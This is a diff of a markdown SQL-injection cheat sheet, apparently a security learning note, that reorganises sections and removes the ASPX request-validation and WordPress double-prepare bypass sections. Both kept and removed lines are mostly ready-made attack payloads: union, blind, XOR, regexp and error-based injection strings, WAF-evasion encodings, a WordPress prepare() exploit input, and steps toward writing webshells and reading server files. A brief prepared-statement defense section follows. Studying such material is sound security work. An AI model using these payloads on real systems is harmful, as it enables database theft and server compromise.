@@ -3,16 +3,14 @@ SQL is a famous database engine which is used with web server. In this situation
 
 🔔 MySQL
 *  [Basic](#basic-injection)  
-*  [Tools](#tools)  
 *  [Union based](#union-based)  
 *  [Blind based](#blind-based)  
 *  [Error based](#error-based)  
+*  [Some injection](#some-injection)  
 *  [Waf bypass](#waf-bypass)  
 *  [Write Webshell](#webshell)  
 *  [Read file](#read-file)  
 *  [sql privilege issue](#sql-privilege-issue)  
-*  [Bypass ASPX RequestValidation](#bypass-requestvalidation-on-aspx)  
-*  [Wordpress4.8.2 double prepare](#wordpress-double-prepare-misuse)  
 *  [Defense](#defense)  
 
 🔔 NoSQL
@@ -37,24 +35,15 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 '|0#
 ```  
 
-# Tools
-* [Mysql Online Terminal](https://paiza.io/projects/_StrduMjyy-CKJM9H4LbdA?language=mysql)  
-
 # Union based
 1. Vulnerable to SQL injection?  
-```sql
-1' or 1"  
-```  
 2. union with **same number** of columns  
 ```sql
 // N+=1, until page cannot show
 1' order by N#
+union select 1, 1, 1,....
 ```  
-3. make sure the place of our injection point  
-```sql
-//  1,2 number will show on the inj point 
-1' and 1=2 union select 1,2...N#
-```  
+3. make sure the place where our result will be showed  
 4. make sure for some basic information  
 ```sql
 union select user(),database(),version(), @@version_compile_os--+
@@ -80,14 +69,11 @@ union select user(),database(),version(), @@version_compile_os--+
 1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // separate with *
 ```  
 
-[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
-**group_concat() is also a little trick.**
-
 # Blind based  
 result is not showed on the page and there is also no any error message.  
+🐶 **Boolean based**  
 **True**: page shows normal.  
 **False**: page shows error or no any result.  
-🐶 **Boolean based**  
 ```sql
 length(str)
 substr(str,pos,len)   // index starts from 1
@@ -105,26 +91,6 @@ boolean based depends on **whether page show things**...
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
 ```
 Blind-based costs lot of time, so script is necessary for us!  
-
-🐶 **XOR injection**  
-```sql
-admin' ^ (ascii(mid((version())from(1)for(1))) > j) ^ '1'='1'#
-// ascii(mid((version())from(1)))
-```  
-Useful when the character `and`, `or`, or comma is limited. What's interesting is that we don't need to use `for` because `ascii()` default to choose the first word.  
-
-🐶 **Regexp injection**  
-```sql
-select (select pass from user where id = 1) regexp '^this_is_pass_word'
-```  
-It's also called the last method to make injection because there are various patterns of regular expressions. Useful when `=`, `in`, `like` is limited.  
-
-🐶 **Order by injection**  
-```sql
-// assume the 4th column content is a948fwlglkm......
-union select 1,2,3,'b',5,6,7 order by 4 (asc)
-```  
-We always use `order by` to get the number of table columns in union-based. However, back to the basic concept of order by, we can use it to do injection just like above. `Order by 4` means order by the 4th column in table, default setting is asc. So, our injection of `b` would become the second result, and data which is before `b` would escalate to first result.  
 
 🐶 **DNS injection**  
 The process of bruteforce still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
@@ -147,12 +113,12 @@ Therefore，our exploit should be: `') or 1=1--+`
 /**
 we need:
 count()            
-concat()            // the primary key which is collided would be showed in error message，so we should concat our target to the primary key
+concat()      // the primary key which is collided would be showed in error message, so we should concat our target to the primary key
 floor(), rand()
 group by
 **/
-?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
-// After we understand how it works completely，we can also modify our payload such like following:
+union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
+// After we understand how it works completely, we can also modify our payload such like following:
 ?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
 ```  
 `floor(rand()x2)` has many same members in the list，and it causes to the collision of `group by key`! (I recommend the following article so much  
@@ -164,7 +130,7 @@ exp(~(select*from(select user())a));  // the result of the query inside is 0, we
 // What is the a at the end? It is alias. We need to assign an alias to subquery (select*from)
 ```  
 
-`select` can also return the result of the query，it will return 0 if if the query is bigger than 0，and will return 1 if the result is 0 (very important!  
+`select` can also return the result of the query, it will return 0 if the query is bigger than 0 and will return 1 if the result is 0 (very important!  
 [The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
 * xpath syntax error  
 `extractvalue()`,`updatexml()` can work on the xml syntax which is provided by the user  
@@ -181,19 +147,37 @@ where table_schema=0xXXXXX
 // If the injection point is after the word limit e.g. order by name limit {$_GET[1]}, 10
 ?1=select id from users where id>5 order by name limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
 // ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
-```
+```  
+
+# Some injection
+🐶 **XOR injection**  
+```sql
+admin' ^ (ascii(mid((version())from(1)for(1))) > j) ^ '1'='1'#
+// ascii(mid((version())from(1)))
+```  
+Useful when the character `and`, `or`, or comma is limited.  
+What's interesting is that we don't need to use `for` because `ascii()` default to choose the first word.  
+
+🐶 **Regexp injection**  
+```sql
+select (select pass from user where id = 1) regexp '^this_is_pass_word'
+```  
+It's also called the last method to make injection because there are various patterns of regular expressions.  
+Useful when `=`, `in`, `like` is limited.  
+
+🐶 **Order by injection**  
+```sql
+// assume the 4th column content is a948fwlglkm......
+union select 1,2,3,'b',5,6,7 order by 4 (asc)
+```  
+We always use `order by` to get the number of table columns in union-based. However, back to the basic concept of order by, we can use it to do injection just like above. `Order by 4` means order by the 4th column in table, default setting is asc. So, our injection of `b` would become the second result, and data which is before `b` would escalate to first result.  
 
 # WAF bypass
 WAF is a defender for web.  
 Tricks:  
-- I want to login  
-  - `id=1' or 1 like 1#`  
-  - `') or '1'=1--`  
 - Space bypass 
   - `select/**/username/**/from/**/users;`  
-  - `select@{backtick}id{backtick}`(I wrap it with {} due to markdown syntax here)  
   - `union select 1,2` -> `union(select(1),2)`  
-  - `%20 %09(tab) %0a(line feed) %0b %0c %0d %a0 /**/` -> `id=1%0aand%0aip=2`  
   - aspx+mssql `%00`, php+mysql `/*%00*/`
 - Obfuscation with Upper Lowercase  
   - `SelecT`  
@@ -213,23 +197,24 @@ Tricks:  
   - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
   - `Char(49)` `Hex('a')` `Unhex(61)`  
   - On asp+iis, server can parse the unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as 'select'  
-  - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on, take a look at [bypass waf with encoding](#bypass-requestvalidation-on-aspx)  
+  - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on  
+     [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
+     [Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  
+
 - Comment 
   - `#`    
   - `--+` `--` `-- -`  
   - `/* ... */` `///**/`(multiple lines)  
-  - {backtick} can be used as comment if  mysql <= 5.5  
   - `;` stacking queries cannot be used in mysql query+php, but it works in PDO  
 - Command bypass  
   - `sleep()` -> `benchmark()`  
-  - `@@datadir` -> `datadir()`  
-- Logic operator  
-  - `and/or` -> `&& / |`  
 - Wide-Character injection  
   - bypass single quote： `%bf%27 %df%27 %aa%27`  
 - keyword `information_schema` bypass  
   - get database name：`select * from users where name = helloworld();`  
     `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
+  - `mysql.innodb_table_stats`  
+  - `sys.statement_analysis`  
 - HPP on asp  
   - When GET/POST/COOKIE submit `uid` at the same time, server would follow the order of GET/POST/COOKIE to receive and split them with comma  
   - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
@@ -263,7 +248,7 @@ C:\inetpub\www\root\
 // @@datadir : database path
 id=1' union select 1, @@basedir, @@datadir--+
 ```
-e.g. With @@basedir we can get the result of ```C:/xampp/mysql```, and document root might be ```C:/xampp/htdocs/```, more content can be taken a look at [INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak) The part of absolute path  
+e.g. With @@basedir we can get the result of ```C:/xampp/mysql```, and document root might be ```C:/xampp/htdocs/```, more content can be taken a look at [INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak) The part of absolute path.  
 
 :racehorse: Webshell with general log  
 Requirement is also **write-permission**, general log would record your history command  
@@ -292,64 +277,11 @@ Attackers or users require read-permission(usually have). We can use `load_file`
 We always run into the SQL privilege issue when we want to write webshell or read other files. Each time attaching, server will check db_user authentication, server can also be set to **limit the attachment from external ip**. If bypass authentication，admin can also limit the command can be used by users。  
 [Ref:Mysql privilege issue](https://www.cnblogs.com/Richardzhu/p/3318595.html)  
 The limitation of `--secure_file_priv` on read write permission:  
-mysql setting of `--secure_file_priv` limit the path of writting files, with `select @@secure_file_priv` we can get the value. Before 5.7.5, the dafault value is **Empty**, and user don't need to worry about permission. In following version, the default value is set to NULL, the tricks such as `select into` even becomes garbage because `@@secure_file_priv` is more difficult to **set** than `general_log`, `@@secure_file_priv` can't be changed when mysql is exec  
+mysql setting of `--secure_file_priv` limit the path of writting files, with `select @@secure_file_priv` we can get the value. Before 5.7.5, the dafault value is **Empty**, and user don't need to worry about permission. In following version, the default value is set to NULL, the tricks such as `select into` even becomes garbage because `@@secure_file_priv` is more difficult to **set** than `general_log`, `@@secure_file_priv` can't be changed when mysql is exec!  
 [Ref:關於mysql中select into outfile權限的探討](https://blog.csdn.net/bnxf00000/article/details/64123549)  
 
-# Bypass RequestValidation on ASPX
-![image](https://farm2.staticflickr.com/1829/43302939171_78fbb87eba_h.jpg)  
-Request Validation is the mechanism of ASP to check the malicious request，and it defaults to block even the common html tag，but we can customize the rules of Request Validation or check by ourselves  
-From the image above, we can find that many server support IBM037,IBM500,IBM1026,cp875，we can get the encoded string with following script  
-```python
-import urllib
-payload = 'xxx'
-print urllib.quote_plus(payload.encode("IBM500"))
-```  
-Take `QueryString` for example，he can receive the GET parameter from request  
-```php
-// Appsec Europe sqlinj challenge
-On Error Resume Next
-
-If Not Request.QueryString("uid").Contains("'") Then
-  ...SELECT name FROM users WHERE uid = Request.QueryString("uid")...
-  Response.Write(Query)
-Else
-  Response.Write("You fail")
-End If
-```
-Apparently，this challenge prevent us from injecting with single quote，but how can we close the single quote to achieve injection...  
-![](https://farm1.staticflickr.com/921/42585039264_b5874cc629_h.jpg)  
-Exploit:  
-第一次`QueryString`時發生了error，但卻因為`On Error Resume Next`而繼續執行下去，第二次`QueryString`時就通過了，這還需要切換Request Method  
-若payload在`QueryString`裡 -> `POST`  
-若payload在`body`裡 -> `GET`  
-除了上面`HTTP Verb Replacement`和`Charset`特殊字集，還有`change body type`,`remove unnecessary part`,`add unuseful part`等方法，細節在這邊先不贅述...  
-* 防禦方式：  
-果然編碼的攻擊方式還是很強大，我們可以透過限制charset的值來避免這種攻擊方式  
-[Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
-[Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  
-
-# Wordpress Double Prepare Misuse  
-Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
-```php
-$query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] );
-$wpdb->query( $query );
-```  
-若我注入`1' or '1'='1`，`prepare()`會用單引號將它包起來置入query語句，並且轉譯單引號。`SELECT * FROM table WHERE column = ' 1\' or \'1\'=\'1 '`，無解...但是如果開發者今天這樣寫的話...  
-```php
-$query = $wpdb->prepare( "SELECT * FROM table WHERE column1 = %s", $_GET['c1'] );
-$query = $wpdb->prepare( $query . " AND column2 = %s", $_GET['c2'] );
-$wpdb->query( $query );
-
-// c1=%s&c2[]=or 1=1--&c2[]=a
-執行結果
-prepare1: SELECT * FROM table WHERE column1 = '%s' AND column2 = %s;
-prepare2: SELECT * FROM table WHERE column1 = ' 'or 1=1--' ' AND column2 = 'a';
-```  
-原因出在prepare()的檢查步驟，我們沒有輸入`'`，而是讓prepare()自己輸入單引號來協助我們閉合...  
-在Wordpress4.8.3的版本之後，patch成使用者輸入的`%`會被取代為66bytes的秘密字串：`{xxxxx...xxx}s`  
-
 # Defense
-The cause of SQL injection is that **user_input works as part of SQL command**!  
+The cause of SQL injection is that **direct concat between user input and SQL syntax**!  
 If we change to use `PreparedStatement`, the SQL sentence will only be compiled for **one time**, and the placeholder(`?`) will be replaced with the value of user input while running. Therefore, this is the best way to avoid SQL injection.  
 However, using `PreparedStatement` doesn't mean the vulnerability of SQL injection doesn't exist. For example, if you still concat user input to SQL sentence instead of using placeholder(`?`) like following:  
 ```sql
